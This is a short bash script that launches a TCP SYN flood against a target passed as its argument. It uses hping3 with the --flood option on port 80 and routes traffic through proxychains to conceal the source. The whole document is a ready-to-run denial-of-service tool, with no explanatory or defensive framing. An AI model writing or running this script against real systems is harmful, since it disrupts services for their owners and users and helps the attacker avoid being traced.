#!/bin/bash

sudo proxychains hping3 -c 15000 -d 500 -S -p 80 --flood "$1"
